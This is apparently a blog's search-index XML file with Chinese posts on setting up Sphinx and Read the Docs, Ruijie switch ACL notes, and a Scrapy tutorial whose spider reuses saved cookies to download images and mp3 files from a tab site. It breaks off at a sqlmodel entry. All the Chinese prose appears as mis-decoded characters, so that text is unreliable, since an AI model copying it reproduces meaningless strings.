<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å¦‚ä½•åˆ›å»ºreadthedoc</title>
      <link href="/2022/12/19/%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAreadthedoc/"/>
      <url>/2022/12/19/%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAreadthedoc/</url>
      
        <content type="html"><![CDATA[<p><a href="https://docs.readthedocs.io/en/stable/tutorial/index.html">readthedocså®˜æ–¹æ•™ç¨‹æ–‡æ¡£</a><br><a href="https://www.sphinx-doc.org/zh_CN/master/usage/index.html">sphinxä¸­æ–‡æ–‡æ¡£</a><br><a href="https://rst-tutorial-elinpf.readthedocs.io/en/latest/">reStructuredText æ•™ç¨‹</a></p><h2 id="åœ¨é¡¹ç›®ä¸­åˆ›å»º"><a href="#åœ¨é¡¹ç›®ä¸­åˆ›å»º" class="headerlink" title="åœ¨é¡¹ç›®ä¸­åˆ›å»º"></a>åœ¨é¡¹ç›®ä¸­åˆ›å»º</h2><p>ä¸€èˆ¬ä½¿ç”¨çš„æ˜¯shpinx, åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸­åˆ›å»º<code>docs</code>æ–‡ä»¶å¤¹</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-built_in">cd</span> docs</span><span class="line">sphinx-quickstart</span></code></pre></div></div><p><strong>æ¨èè¿˜æ˜¯å°† <code>build</code> å’Œ <code>source</code> åˆ†å¼€</strong></p><h2 id="ä¸»é¢˜"><a href="#ä¸»é¢˜" class="headerlink" title="ä¸»é¢˜"></a>ä¸»é¢˜</h2><p>æ¨èä½¿ç”¨<code>sphinx_rtd_theme</code>ä¸»é¢˜ï¼Œé¦–å…ˆéœ€è¦å®‰è£…</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-cmake codeBlockLines"><span class="line">pip <span class="hljs-keyword">install</span> sphinx-rtd-theme</span></code></pre></div></div><p>ç„¶ååœ¨<code>conf.py</code>ä¸­ä½¿ç”¨</p><div class="codeBlockContainer"><div class="codeBlockTitle">conf.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> sphinx_rtd_theme</span><span class="line"></br></span><span class="line">html_theme = <span class="hljs-string">&#x27;sphinx_rtd_theme&#x27;</span></span></code></pre></div></div><h2 id="autodoc"><a href="#autodoc" class="headerlink" title="autodoc"></a>autodoc</h2><p><a href="https://www.sphinx-doc.org/zh_CN/master/usage/extensions/autodoc.html">ä¸­æ–‡æ–‡æ¡£</a></p><ol><li>åœ¨<code>docs/requirements.txt</code> æ–‡ä»¶ä¸­å®šä¹‰éœ€è¦çš„pythonåŒ…</li></ol><div class="codeBlockContainer"><div class="codeBlockTitle">docs/requirements.txt</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">alabaster==0.7.12</span><span class="line">Sphinx==5.3.0</span><span class="line">sphinx-rtd-theme==1.1.1</span><span class="line">sphinx-copybutton==0.5.0</span></code></pre></div></div><ol start="2"><li>åœ¨<code>conf.py</code>ä¸­å¼•å…¥ï¼Œç„¶åè¿›è¡Œæ‰©å±•å®šä¹‰</li></ol><div class="codeBlockContainer"><div class="codeBlockTitle">conf.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line"><span class="hljs-keyword">import</span> sys</span><span class="line">sys.path.insert(<span class="hljs-number">0</span>, os.path.abspath(<span class="hljs-string">&#x27;..&#x27;</span>))</span><span class="line"></br></span><span class="line">extensions = [</span><span class="line">    <span class="hljs-string">&#x27;sphinx.ext.autodoc&#x27;</span>,</span><span class="line">    <span class="hljs-string">&quot;sphinx.ext.viewcode&quot;</span>,</span><span class="line">    <span class="hljs-string">&quot;sphinx.ext.napoleon&quot;</span>,</span><span class="line">    <span class="hljs-string">&quot;sphinx.ext.intersphinx&quot;</span>,</span><span class="line">    <span class="hljs-string">&quot;sphinx.ext.autosectionlabel&quot;</span>,</span><span class="line">    <span class="hljs-string">&#x27;sphinx_copybutton&#x27;</span>,</span><span class="line">]</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">.. autoclass:: net_inspect.NetInspect</span><span class="line">   :members: </span><span class="line">   :undoc-members:</span></code></pre></div></div><p>å¦‚æœæ„å»ºä¸æˆåŠŸï¼Œå»<a href="https://readthedocs.org/">readthedocs</a> æ„å»ºé‡Œé¢æŸ¥çœ‹åŸå› ï¼Œæœ‰å¯èƒ½æ˜¯å› ä¸ºæœ‰äº›æ¨¡å—æ²¡æœ‰å¼•å…¥ï¼Œ<br>è¿™æ—¶å€™å°±éœ€è¦åœ¨<code>docs/requirements.txt</code>ä¸­åŠ å…¥è¿™ä¸ªæ¨¡å—å³å¯ã€‚</p><p><a href="https://stackoverflow.com/questions/10324393/sphinx-build-fail-autodoc-cant-import-find-module">æ„å»ºä¸æˆåŠŸå‚è€ƒé—®ç­”</a></p><h2 id="å®šä¹‰å¼€å§‹æ–‡ä»¶ä¸º-index"><a href="#å®šä¹‰å¼€å§‹æ–‡ä»¶ä¸º-index" class="headerlink" title="å®šä¹‰å¼€å§‹æ–‡ä»¶ä¸º index"></a>å®šä¹‰å¼€å§‹æ–‡ä»¶ä¸º index</h2><div class="codeBlockContainer"><div class="codeBlockTitle">conf.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">master = <span class="hljs-string">&#x27;index&#x27;</span></span></code></pre></div></div><h2 id="æœ¬åœ°åˆ›å»º-html"><a href="#æœ¬åœ°åˆ›å»º-html" class="headerlink" title="æœ¬åœ°åˆ›å»º html"></a>æœ¬åœ°åˆ›å»º html</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">./make.bat clean ; ./make.bat html</span></code></pre></div></div><h2 id="å‘å¸ƒ"><a href="#å‘å¸ƒ" class="headerlink" title="å‘å¸ƒ"></a>å‘å¸ƒ</h2><p><a href="https://readthedocs.org/dashboard/">readthedocs</a> ä¸­å¯¼å…¥é¡¹ç›®å³å¯ï¼ŒæˆåŠŸåæ¯æ¬¡githubä¸Šé¢æœ‰æ›´æ–°ï¼Œreadthedocsä¼šè‡ªåŠ¨æ›´æ–°</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°é€šé‡åˆ°é—®é¢˜è§£å†³æ–¹æ¡ˆ</title>
      <link href="/2022/11/09/%E6%95%B0%E9%80%9A%E9%81%87%E5%88%B0%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2022/11/09/%E6%95%B0%E9%80%9A%E9%81%87%E5%88%B0%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h2 id="é€šç”¨"><a href="#é€šç”¨" class="headerlink" title="é€šç”¨"></a>é€šç”¨</h2><h3 id="ACL-æ–¹å‘é—®é¢˜"><a href="#ACL-æ–¹å‘é—®é¢˜" class="headerlink" title="ACL æ–¹å‘é—®é¢˜"></a>ACL æ–¹å‘é—®é¢˜</h3><p>å¦‚æœæ˜¯ç¡¬æ¥å£ï¼Œé‚£ä¹ˆå°±æŒ‰æµé‡æ–¹å‘åŒ¹é…å³å¯</p><p>å¦‚æœæ˜¯VLAN, é‚£ä¹ˆ</p><ol><li><code>in</code> æ–¹å‘ï¼š æºåœ°å€å¿…ç„¶æ˜¯vlançš„ipç½‘æ®µ</li><li><code>out</code>æ–¹å‘ï¼š ç›®çš„åœ°å€å¿…ç„¶æ˜¯vlançš„ipç½‘æ®µ</li></ol><h2 id="Ruijie"><a href="#Ruijie" class="headerlink" title="Ruijie"></a>Ruijie</h2><h3 id="ACL-å¦‚ä½•è®¡æ•°"><a href="#ACL-å¦‚ä½•è®¡æ•°" class="headerlink" title="ACL å¦‚ä½•è®¡æ•°"></a>ACL å¦‚ä½•è®¡æ•°</h3><p>é”æ·éœ€è¦å¼€å¯</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ada codeBlockLines"><span class="line">[config]ip <span class="hljs-keyword">access</span>-list counter &lt;acl&gt;</span></code></pre></div></div><ul><li><a href="https://www.ruijie.com.cn/Fu/Article/1c62b7e8-3689-461a-be73-a58dc88a5e78/RG-S5750H%E7%B3%BB%E5%88%97%E4%BA%A4%E6%8D%A2%E6%9C%BARGOS%2012.2(2)B0602%E7%89%88%E6%9C%AC%E9%85%8D%E7%BD%AE%E6%89%8B%E5%86%8C(V1.0)/PDF/00-pdf/07-ACL%E5%92%8CQoS.pdf">å‚è€ƒæ–‡æ¡£ ACL&amp;QoS</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ•°é€š </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>scrapy å­¦ä¹ ä½¿ç”¨</title>
      <link href="/2022/10/28/scrapy-%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/10/28/scrapy-%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><code>scrapy</code> æ˜¯ä¸€ä¸ªçˆ¬è™«æ¡†æ¶ï¼Œé¦–å…ˆäº†è§£è¿™ä¸ªæ¡†æ¶çš„åŸºæœ¬ç»“æ„ï¼Œç„¶åé’ˆå¯¹å®é™…ä½¿ç”¨è¿›è¡Œå­¦ä¹ </p><ul><li><a href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/intro/overview.html">å®˜æ–¹æ–‡æ¡£</a></li><li>[]</li></ul><h2 id="æ¡†æ¶ç»“æ„"><a href="#æ¡†æ¶ç»“æ„" class="headerlink" title="æ¡†æ¶ç»“æ„"></a>æ¡†æ¶ç»“æ„</h2><p><img src="/2022/10/28/scrapy-%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/1.jpg"></p><p><strong>Scrapy Engine</strong></p><blockquote><p>å¼•æ“è´Ÿè´£æ§åˆ¶æ•°æ®æµåœ¨ç³»ç»Ÿä¸­æ‰€æœ‰ç»„ä»¶ä¸­æµåŠ¨ï¼Œå¹¶åœ¨ç›¸åº”åŠ¨ä½œå‘ç”Ÿæ—¶è§¦å‘äº‹ä»¶ã€‚ è¯¦ç»†å†…å®¹æŸ¥çœ‹ä¸‹é¢çš„æ•°æ®æµ(Data Flow)éƒ¨åˆ†ã€‚</p></blockquote><p>ç›¸å½“äºå¤§è„‘</p><p><strong>è°ƒåº¦å™¨(Scheduler)</strong></p><blockquote><p>è°ƒåº¦å™¨ä»å¼•æ“æ¥å—requestå¹¶å°†ä»–ä»¬å…¥é˜Ÿï¼Œä»¥ä¾¿ä¹‹åå¼•æ“è¯·æ±‚ä»–ä»¬æ—¶æä¾›ç»™å¼•æ“ã€‚</p></blockquote><p>åˆå§‹çš„çˆ¬å–URLå’Œåç»­åœ¨é¡µé¢ä¸­è·å–çš„å¾…çˆ¬å–çš„URLå°†æ”¾å…¥è°ƒåº¦å™¨ä¸­ï¼Œç­‰å¾…çˆ¬å–ã€‚åŒæ—¶è°ƒåº¦å™¨ä¼šè‡ªåŠ¨å»é™¤é‡å¤çš„URLï¼ˆå¦‚æœç‰¹å®šçš„URLä¸éœ€è¦å»é‡ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®å®ç°ï¼Œå¦‚postè¯·æ±‚çš„URLï¼‰</p><p><strong>ä¸‹è½½å™¨(Downloader)</strong></p><blockquote><p>ä¸‹è½½å™¨è´Ÿè´£è·å–é¡µé¢æ•°æ®å¹¶æä¾›ç»™å¼•æ“ï¼Œè€Œåæä¾›ç»™spiderã€‚</p></blockquote><p><strong>Spiders</strong></p><blockquote><p>Spideræ˜¯Scrapyç”¨æˆ·ç¼–å†™ç”¨äºåˆ†æresponseå¹¶æå–item(å³è·å–åˆ°çš„item)æˆ–é¢å¤–è·Ÿè¿›çš„URLçš„ç±»ã€‚ æ¯ä¸ªspiderè´Ÿè´£å¤„ç†ä¸€ä¸ªç‰¹å®š(æˆ–ä¸€äº›)ç½‘ç«™ã€‚</p></blockquote><p><strong>Item Pipeline</strong></p><blockquote><p>Item Pipelineè´Ÿè´£å¤„ç†è¢«spideræå–å‡ºæ¥çš„itemã€‚å…¸å‹çš„å¤„ç†æœ‰æ¸…ç†ã€ éªŒè¯åŠæŒä¹…åŒ–(ä¾‹å¦‚å­˜å–åˆ°æ•°æ®åº“ä¸­)ã€‚</p></blockquote><p><strong>Spiderä¸­é—´ä»¶(Spider middlewares)</strong></p><blockquote><p>Spiderä¸­é—´ä»¶æ˜¯åœ¨å¼•æ“åŠSpiderä¹‹é—´çš„ç‰¹å®šé’©å­(specific hook)ï¼Œå¤„ç†spiderçš„è¾“å…¥(response)å’Œè¾“å‡º(itemsåŠrequests)ã€‚ å…¶æä¾›äº†ä¸€ä¸ªç®€ä¾¿çš„æœºåˆ¶ï¼Œé€šè¿‡æ’å…¥è‡ªå®šä¹‰ä»£ç æ¥æ‰©å±•ScrapyåŠŸèƒ½ã€‚</p></blockquote><p><strong>ä¸‹è½½å™¨ä¸­é—´ä»¶(Downloader middlewares)</strong></p><blockquote><p>ä¸‹è½½å™¨ä¸­é—´ä»¶æ˜¯åœ¨å¼•æ“åŠä¸‹è½½å™¨ä¹‹é—´çš„ç‰¹å®šé’©å­(specific hook)ï¼Œå¤„ç†Downloaderä¼ é€’ç»™å¼•æ“çš„responseã€‚ å…¶æä¾›äº†ä¸€ä¸ªç®€ä¾¿çš„æœºåˆ¶ï¼Œé€šè¿‡æ’å…¥è‡ªå®šä¹‰ä»£ç æ¥æ‰©å±•ScrapyåŠŸèƒ½ã€‚</p></blockquote><p>æ•°æ®æµï¼š</p><ol><li><p>å¼•æ“æ‰“å¼€ä¸€ä¸ªç½‘ç«™(open a domain)ï¼Œæ‰¾åˆ°å¤„ç†è¯¥ç½‘ç«™çš„Spiderå¹¶å‘è¯¥spiderè¯·æ±‚ç¬¬ä¸€ä¸ªè¦çˆ¬å–çš„URL(s)ã€‚</p></li><li><p>å¼•æ“ä»Spiderä¸­è·å–åˆ°ç¬¬ä¸€ä¸ªè¦çˆ¬å–çš„URLå¹¶åœ¨è°ƒåº¦å™¨(Scheduler)ä»¥Requestè°ƒåº¦ã€‚</p></li><li><p>å¼•æ“å‘è°ƒåº¦å™¨è¯·æ±‚ä¸‹ä¸€ä¸ªè¦çˆ¬å–çš„URLã€‚</p></li><li><p>è°ƒåº¦å™¨è¿”å›ä¸‹ä¸€ä¸ªè¦çˆ¬å–çš„URLç»™å¼•æ“ï¼Œå¼•æ“å°†URLé€šè¿‡ä¸‹è½½ä¸­é—´ä»¶(è¯·æ±‚(request)æ–¹å‘)è½¬å‘ç»™ä¸‹è½½å™¨(Downloader)ã€‚</p></li><li><p>ä¸€æ—¦é¡µé¢ä¸‹è½½å®Œæ¯•ï¼Œä¸‹è½½å™¨ç”Ÿæˆä¸€ä¸ªè¯¥é¡µé¢çš„Responseï¼Œå¹¶å°†å…¶é€šè¿‡ä¸‹è½½ä¸­é—´ä»¶(è¿”å›(response)æ–¹å‘)å‘é€ç»™å¼•æ“ã€‚</p></li><li><p>å¼•æ“ä»ä¸‹è½½å™¨ä¸­æ¥æ”¶åˆ°Responseå¹¶é€šè¿‡Spiderä¸­é—´ä»¶(è¾“å…¥æ–¹å‘)å‘é€ç»™Spiderå¤„ç†ã€‚</p></li><li><p>Spiderå¤„ç†Responseå¹¶è¿”å›çˆ¬å–åˆ°çš„ItemåŠ(è·Ÿè¿›çš„)æ–°çš„Requestç»™å¼•æ“ã€‚</p></li><li><p>å¼•æ“å°†(Spiderè¿”å›çš„)çˆ¬å–åˆ°çš„Itemç»™Item Pipelineï¼Œå°†(Spiderè¿”å›çš„)Requestç»™è°ƒåº¦å™¨ã€‚</p></li><li><p>(ä»ç¬¬äºŒæ­¥)é‡å¤ç›´åˆ°è°ƒåº¦å™¨ä¸­æ²¡æœ‰æ›´å¤šåœ°requestï¼Œå¼•æ“å…³é—­è¯¥ç½‘ç«™ã€‚</p></li></ol><h2 id="åˆ›å»ºçˆ¬è™«é¡¹ç›®"><a href="#åˆ›å»ºçˆ¬è™«é¡¹ç›®" class="headerlink" title="åˆ›å»ºçˆ¬è™«é¡¹ç›®"></a>åˆ›å»ºçˆ¬è™«é¡¹ç›®</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">scrapy startproject scrapyspider</span></span></code></pre></div></div><p>ä¼šåˆ›å»ºä»¥ä¸‹ç›®å½•å’Œæ–‡ä»¶ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-vim codeBlockLines"><span class="line">scrapyspider/</span><span class="line">    scrapy.cfg</span><span class="line">    scrapyspider/</span><span class="line">        __init__.<span class="hljs-keyword">py</span></span><span class="line">        <span class="hljs-built_in">items</span>.<span class="hljs-keyword">py</span></span><span class="line">        pipelines.<span class="hljs-keyword">py</span></span><span class="line">        settings.<span class="hljs-keyword">py</span></span><span class="line">        spiders/</span><span class="line">            __init__.<span class="hljs-keyword">py</span></span></code></pre></div></div><ul><li>scrapy.cfg: é¡¹ç›®çš„é…ç½®æ–‡ä»¶ã€‚</li><li>scrapyspider/: è¯¥é¡¹ç›®çš„pythonæ¨¡å—ã€‚ä¹‹åæ‚¨å°†åœ¨æ­¤åŠ å…¥ä»£ç ã€‚</li><li>scrapyspider/items.py: é¡¹ç›®ä¸­çš„itemæ–‡ä»¶ã€‚</li><li>scrapyspider/pipelines.py: é¡¹ç›®ä¸­çš„pipelinesæ–‡ä»¶ã€‚</li><li>scrapyspider/settings.py: é¡¹ç›®çš„è®¾ç½®æ–‡ä»¶ã€‚</li><li>scrapyspider/spiders/: æ”¾ç½®spiderä»£ç çš„ç›®å½•ã€‚</li></ul><h2 id="æ¡ˆä¾‹ç¼–å†™çˆ¬è™«"><a href="#æ¡ˆä¾‹ç¼–å†™çˆ¬è™«" class="headerlink" title="æ¡ˆä¾‹ç¼–å†™çˆ¬è™«"></a>æ¡ˆä¾‹ç¼–å†™çˆ¬è™«</h2><p>æ‰§è¡Œçˆ¬è™«å…¶å®æ˜¯æ‰§è¡Œçˆ¬è™«é¡¹ç›®é‡Œé¢çš„Spideré¡¹ç›®ï¼Œæ‰€ä»¥é¦–å…ˆè¦åˆ›å»ºä¸€ä¸ªSpideré¡¹ç›®ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-mipsasm codeBlockLines"><span class="line"><span class="hljs-keyword">scrapy </span>genspider <span class="hljs-keyword">bule_item </span>www.tenholes.com</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> scrapy</span><span class="line"><span class="hljs-keyword">from</span> scrapy.http <span class="hljs-keyword">import</span> Request</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> ..items <span class="hljs-keyword">import</span> BluesItem</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BluesItemSpider</span>(<span class="hljs-params">scrapy.Spider</span>):</span></span><span class="line">    name = <span class="hljs-string">&#x27;blues_item&#x27;</span></span><span class="line">    allowed_domains = [<span class="hljs-string">&#x27;www.tenholes.com&#x27;</span>]</span><span class="line">    start_urls = [</span><span class="line">        <span class="hljs-string">&#x27;http://www.tenholes.com/tabs/catelist?id=1&amp;page=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)</span><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">29</span>)</span><span class="line">    ]</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start_requests</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        cookies = self.get_cookies()</span><span class="line">        <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> self.start_urls:</span><span class="line">            <span class="hljs-keyword">yield</span> Request(url, cookies=cookies, dont_filter=<span class="hljs-literal">True</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span></span><span class="line"></br></span><span class="line">        content = response.xpath(<span class="hljs-string">&#x27;//div[@class=&quot;ms-list&quot;]/a&#x27;</span>)</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> content:</span><span class="line">            item = BluesItem()</span><span class="line"></br></span><span class="line">            item[<span class="hljs-string">&#x27;name&#x27;</span>] = each.xpath(</span><span class="line">                <span class="hljs-string">&#x27;./p[@class=&quot;ms-tit ellipsis&quot;]/text()&#x27;</span></span><span class="line">            ).extract_first()</span><span class="line">            item[<span class="hljs-string">&#x27;music_url&#x27;</span>] = each.xpath(<span class="hljs-string">&#x27;./@href&#x27;</span>).extract_first()</span><span class="line"></br></span><span class="line">            <span class="hljs-keyword">yield</span> (item)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_cookies</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">dict</span>:</span></span><span class="line">        cookies_str = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cookie&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read().strip()</span><span class="line">        <span class="hljs-comment"># å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—å…¸</span></span><span class="line">        cookies = &#123;&#125;</span><span class="line">        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> cookies_str.split(<span class="hljs-string">&#x27;;&#x27;</span>):</span><span class="line">            name, value = line.strip().split(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-number">1</span>)</span><span class="line">            cookies[name] = value</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">return</span> cookies</span></code></pre></div></div><p>åœ¨parseä¸­ä¹Ÿå¯ç”¨ä½¿ç”¨<code>yield scrapy.Request</code>æ¥è¯·æ±‚ä¸‹ä¸€ä¸ªé¡µé¢ã€‚</p><p><code>Request</code>ä¸­è¿˜å¯ä»¥å®šä¹‰<code>callback</code>æ¥æŒ‡å®šå›è°ƒå‡½æ•°ï¼Œ<code>meta</code>æ¥ä¼ é€’å‚æ•°ã€‚</p><ul><li><a href="https://codeantenna.com/a/zcHXM3XuZa">ä¸€ä¸ªç±»ä¼¼çš„æ¡ˆä¾‹</a></li></ul><h3 id="è®¾ç½®-output-æ ¼å¼ä¸º-utf-8"><a href="#è®¾ç½®-output-æ ¼å¼ä¸º-utf-8" class="headerlink" title="è®¾ç½® output æ ¼å¼ä¸º utf-8"></a>è®¾ç½® output æ ¼å¼ä¸º utf-8</h3><div class="codeBlockContainer"><div class="codeBlockTitle">settings.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">FEED_EXPORT_ENCODING = <span class="hljs-string">&#x27;utf-8&#x27;</span></span></code></pre></div></div><h3 id="å¯¹å›¾ç‰‡å’Œæ–‡ä»¶è¿›è¡Œä¸‹è½½"><a href="#å¯¹å›¾ç‰‡å’Œæ–‡ä»¶è¿›è¡Œä¸‹è½½" class="headerlink" title="å¯¹å›¾ç‰‡å’Œæ–‡ä»¶è¿›è¡Œä¸‹è½½"></a>å¯¹å›¾ç‰‡å’Œæ–‡ä»¶è¿›è¡Œä¸‹è½½</h3><p>åœ¨ä½¿ç”¨æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°<code>MediaPipeline</code>æ— æ³•è¿›è¡ŒæŒ‡å®š<code>file_path</code>ï¼Œå¯¼è‡´æ— æ³•ä¸‹è½½åæ— æ³•ä¿å­˜ã€‚åªèƒ½ç”¨<code>FilesPipeline</code>å’Œ<code>ImagesPipeline</code></p><p>é¦–å…ˆè¦åœ¨<code>settings.py</code>ä¸­å®šä¹‰ä¸¤ä¸ªä¸œè¥¿ï¼š</p><ol><li><code>FILES_STORE</code>æˆ–è€…<code>IMAGES_STORE</code>è·¯å¾„</li><li><code>ITEM_PIPELINES</code> éœ€è¦ä½¿ç”¨Pipeline</li></ol><div class="codeBlockContainer"><div class="codeBlockTitle">settings.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">ITEM_PIPELINES = &#123;</span><span class="line">    <span class="hljs-string">&#x27;blues.pipelines.SongImageDwonloadPipeline&#x27;</span>: <span class="hljs-number">300</span>,</span><span class="line">    <span class="hljs-string">&#x27;blues.pipelines.SongSfMp3DownloadPipline&#x27;</span>: <span class="hljs-number">301</span>,</span><span class="line">&#125;</span><span class="line"></br></span><span class="line">IMAGES_STORE = <span class="hljs-string">&#x27;download_file&#x27;</span></span><span class="line">FILES_STORE = <span class="hljs-string">&#x27;download_file&#x27;</span></span></code></pre></div></div><p>ç„¶åå†åœ¨<code>pipelines.py</code>æ–‡ä»¶ä¸­å®šä¹‰éœ€è¦ä¸‹è½½çš„å†…å®¹ã€‚</p><div class="codeBlockContainer"><div class="codeBlockTitle">pipelines.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> scrapy.pipelines.images <span class="hljs-keyword">import</span> ImagesPipeline</span><span class="line"><span class="hljs-keyword">from</span> scrapy.pipelines.files <span class="hljs-keyword">import</span> FilesPipeline</span><span class="line"><span class="hljs-keyword">from</span> scrapy <span class="hljs-keyword">import</span> Request</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> .func <span class="hljs-keyword">import</span> cookies</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SongImageDwonloadPipeline</span>(<span class="hljs-params">ImagesPipeline</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_media_requests</span>(<span class="hljs-params">self, item, info</span>):</span></span><span class="line">        <span class="hljs-comment"># metaé‡Œé¢çš„æ•°æ®æ˜¯ä»spiderè·å–ï¼Œç„¶åé€šè¿‡metaä¼ é€’ç»™ä¸‹é¢æ–¹æ³•ï¼šfile_path</span></span><span class="line">        <span class="hljs-keyword">yield</span> Request(</span><span class="line">            item[<span class="hljs-string">&#x27;song_image_url&#x27;</span>], meta=&#123;<span class="hljs-string">&#x27;name&#x27;</span>: item[<span class="hljs-string">&#x27;name&#x27;</span>]&#125;, cookies=cookies</span><span class="line">        )</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># é‡å‘½åï¼Œè‹¥ä¸é‡å†™è¿™å‡½æ•°ï¼Œå›¾ç‰‡åä¸ºå“ˆå¸Œï¼Œå°±æ˜¯ä¸€ä¸²ä¹±ä¸ƒå…«ç³Ÿçš„åå­—</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">file_path</span>(<span class="hljs-params">self, request, response=<span class="hljs-literal">None</span>, info=<span class="hljs-literal">None</span>, *, item=<span class="hljs-literal">None</span></span>):</span></span><span class="line">        name = request.meta[<span class="hljs-string">&#x27;name&#x27;</span>]</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">return</span> name + <span class="hljs-string">&#x27;/song.jpg&#x27;</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SongSfMp3DownloadPipline</span>(<span class="hljs-params">FilesPipeline</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_media_requests</span>(<span class="hljs-params">self, item, info</span>):</span></span><span class="line">        <span class="hljs-keyword">yield</span> Request(</span><span class="line">            item[<span class="hljs-string">&#x27;song_mp3_sf_url&#x27;</span>], meta=&#123;<span class="hljs-string">&#x27;name&#x27;</span>: item[<span class="hljs-string">&#x27;name&#x27;</span>]&#125;, cookies=cookies</span><span class="line">        )</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">file_path</span>(<span class="hljs-params">self, request, response=<span class="hljs-literal">None</span>, info=<span class="hljs-literal">None</span>, *, item=<span class="hljs-literal">None</span></span>):</span></span><span class="line">        name = request.meta[<span class="hljs-string">&#x27;name&#x27;</span>]</span><span class="line">        <span class="hljs-keyword">return</span> name + <span class="hljs-string">&#x27;/ç¤ºèŒƒ.mp3&#x27;</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmode å­¦ä¹ </title>
      <link href="/2022/10/24/sqlmodel-%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/10/24/sqlmodel-%E5%AD%A6%E4%B9%A0/</url>
      
